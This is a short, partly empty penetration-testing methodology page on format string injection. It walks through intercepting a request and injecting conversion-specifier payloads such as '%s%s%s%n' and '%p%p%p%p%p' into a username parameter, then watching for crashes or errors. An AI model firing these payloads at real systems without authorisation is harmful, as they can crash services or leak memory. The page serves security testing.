# Format String Injection

## Check List

## Methodology

### Black Box

#### Format string attack

{% stepper %}
{% step %}
Navigate to the target web application and identify an input parameter that is user-controllable, Normal request

```http
GET /userinfo?username=unk9vvn HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Using Burp Suite, intercept the request and check whether the value of the username parameter is processed on the server side, Inject a payload containing Conversion Specifiers into the username parameter

```perl
%s%s%s%n
```
{% endstep %}

{% step %}
Injected request

```http
GET /userinfo?username=%25s%25s%25s%25n HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send the request and observe the server response to determine whether the application crashes or displays unexpected output, If needed, inject another payload containing different Conversion Specifiers

```perl
%p%p%p%p%p
```
{% endstep %}

{% step %}
Injected request

```http
GET /userinfo?username=%25p%25p%25p%25p%25p HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Then observe the server response to determine whether an error such as HTTP 500 or a timeout occurs, If the application crashes or displays unexpected output, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
